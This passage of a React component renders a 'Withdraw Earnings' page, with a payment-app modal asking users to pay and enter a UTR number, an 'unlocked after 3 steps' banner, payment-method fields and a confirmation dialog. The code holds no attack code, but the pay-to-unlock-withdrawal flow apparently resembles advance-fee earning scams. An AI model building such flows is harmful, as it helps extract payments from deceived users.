              ⚡ Open {payModalApp.name} (Mobile Auto-Pay)
            </a>


            <button
              onClick={() => {
                setPayModalApp(null)
                setTimeout(() => document.getElementById('activation-utr')?.focus(), 200)
              }}
              className="btn btn-ghost btn-full"
              style={{ fontSize: 14, fontWeight: 700 }}
            >
              ✅ Done Paying? Enter UTR Number →
            </button>
          </div>
        </div>
      )}
    </div>
  )

  /* ══ WITHDRAW FORM ═══════════════════════════════════════════════════════ */
  const pm = PAYMENT_METHODS.find(m => m.id === method)!
  const amtNum = parseFloat(amount) || 0
  const canSubmit = amtNum >= wallet.minWithdrawal && amtNum <= wallet.balance
    && Object.values(accountDetails).every(v => v.trim())

  return (
    <div className="animate-fade-in" style={{ maxWidth: 640, margin: '0 auto' }}>

      <div style={{ marginBottom: 24 }}>
        <h1 style={{ fontSize: 28, fontWeight: 800, marginBottom: 6 }}>Withdraw Earnings</h1>
        <p style={{ color: 'var(--text-muted)' }}>All steps complete — withdraw your earnings anytime!</p>
      </div>

      <div style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '14px 18px', background: 'rgba(16,185,129,0.07)', border: '1px solid rgba(16,185,129,0.3)', borderRadius: 12, marginBottom: 22 }}>
        <span style={{ fontSize: 26 }}>🔓</span>
        <div>
          <div style={{ fontWeight: 800, fontSize: 15, color: '#10b981' }}>Withdrawal Unlocked ✓</div>
          <div style={{ fontSize: 12, color: 'var(--text-muted)' }}>All 3 steps done · Min ₹{wallet.minWithdrawal.toLocaleString('en-IN')}</div>
        </div>
      </div>

      <div className="card" style={{ marginBottom: 22, textAlign: 'center', padding: '28px 24px', background: 'linear-gradient(135deg, rgba(108,71,255,0.1) 0%, var(--bg-card) 100%)', borderColor: 'rgba(108,71,255,0.3)' }}>
        <div style={{ fontSize: 12, color: 'var(--text-muted)', fontWeight: 600, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.05em' }}>Available Balance</div>
        <div style={{ fontSize: 44, fontWeight: 900, color: 'var(--primary)', marginBottom: 4 }}>{formatINR(wallet.balance)}</div>
        <div style={{ fontSize: 13, color: 'var(--text-muted)' }}>Minimum: {formatINR(wallet.minWithdrawal)}</div>
      </div>

      {error && <div style={{ background: 'var(--error-bg)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 10, padding: '14px 16px', fontSize: 14, color: 'var(--error)', marginBottom: 18 }}>{error}</div>}

      <div className="card" style={{ marginBottom: 18 }}>
        <h2 style={{ fontSize: 16, fontWeight: 700, marginBottom: 14 }}>Select Payment Method</h2>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 10 }}>
          {PAYMENT_METHODS.map(m => (
            <button key={m.id} onClick={() => { setMethod(m.id); setAccountDetails({}) }} style={{
              padding: '14px 8px', borderRadius: 12, cursor: 'pointer', textAlign: 'center',
              border: `2px solid ${method === m.id ? 'var(--primary)' : 'var(--border)'}`,
              background: method === m.id ? 'rgba(108,71,255,0.1)' : 'var(--bg-surface)', transition: 'all 0.2s',
            }}>
              <div style={{ fontSize: 22, marginBottom: 4 }}>{m.icon}</div>
              <div style={{ fontSize: 11, fontWeight: 700, color: method === m.id ? 'var(--primary)' : 'var(--text-muted)' }}>{m.label}</div>
            </button>
          ))}
        </div>
      </div>

      <div className="card" style={{ marginBottom: 18 }}>
        <h2 style={{ fontSize: 16, fontWeight: 700, marginBottom: 14 }}>{pm.label} Details</h2>
        {pm.fields.map(f => (
          <div key={f.name} className="input-group" style={{ marginBottom: 12 }}>
            <label className="input-label">{f.label}</label>
            <input type="text" className="input" placeholder={f.placeholder}
              value={accountDetails[f.name] ?? ''} id={`withdraw-${f.name}`}
              onChange={e => setAccountDetails(d => ({ ...d, [f.name]: e.target.value }))}
            />
          </div>
        ))}
      </div>

      <div className="card" style={{ marginBottom: 22 }}>
        <h2 style={{ fontSize: 16, fontWeight: 700, marginBottom: 14 }}>Withdrawal Amount</h2>
        <div className="input-group">
          <label className="input-label">Amount (₹)</label>
          <input type="number" className="input" id="withdraw-amount"
            placeholder={`Min ₹${wallet.minWithdrawal}`} value={amount}
            onChange={e => setAmount(e.target.value)} min={wallet.minWithdrawal} max={wallet.balance}
          />
        </div>
        <div style={{ display: 'flex', gap: 8, marginTop: 10, flexWrap: 'wrap' }}>
          {[wallet.minWithdrawal, Math.floor(wallet.balance / 2), wallet.balance]
            .filter((v, i, a) => v > 0 && a.indexOf(v) === i)
            .map(p => (
              <button key={p} className="btn btn-ghost btn-sm" onClick={() => setAmount(String(p))}>
                ₹{p.toLocaleString('en-IN')}
              </button>
            ))}
        </div>
        {amtNum > 0 && amtNum < wallet.minWithdrawal && (
          <p style={{ fontSize: 12, color: 'var(--error)', marginTop: 6 }}>Min ₹{wallet.minWithdrawal.toLocaleString('en-IN')}</p>
        )}
      </div>

      <button className="btn btn-primary btn-full btn-lg" id="withdraw-submit"
        disabled={!canSubmit || submitting} onClick={() => setConfirmModal(true)}>
        Request Withdrawal
      </button>

      {confirmModal && (
        <div className="modal-overlay" onClick={() => setConfirmModal(false)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <h2 style={{ fontSize: 20, marginBottom: 16 }}>Confirm Withdrawal</h2>
            <div style={{ padding: 16, background: 'var(--bg-surface)', borderRadius: 12, marginBottom: 20 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 10, fontSize: 14 }}>
                <span style={{ color: 'var(--text-muted)' }}>Amount</span>
                <span style={{ fontWeight: 800, fontSize: 20, color: 'var(--primary)' }}>{formatINR(amtNum)}</span>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 14 }}>
                <span style={{ color: 'var(--text-muted)' }}>Method</span>
                <span style={{ fontWeight: 600 }}>{pm.label}</span>
              </div>
            </div>
            <p style={{ fontSize: 13, color: 'var(--text-muted)', marginBottom: 22, lineHeight: 1.6 }}>
              Confirm withdrawal of {formatINR(amtNum)}? Processed within 1–3 business days.
            </p>
            <div style={{ display: 'flex', gap: 12 }}>
              <button className="btn btn-ghost btn-full" onClick={() => setConfirmModal(false)}>Cancel</button>
              <button className="btn btn-primary btn-full" id="withdraw-confirm"
                onClick={handleWithdraw} disabled={submitting}>
                {submitting ? 'Processing...' : 'Confirm'}
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`@media(max-width:768px){div[style*="repeat(4, 1fr)"]{grid-template-columns:repeat(2,1fr)!important}}`}</style>
    </div>
  )
}
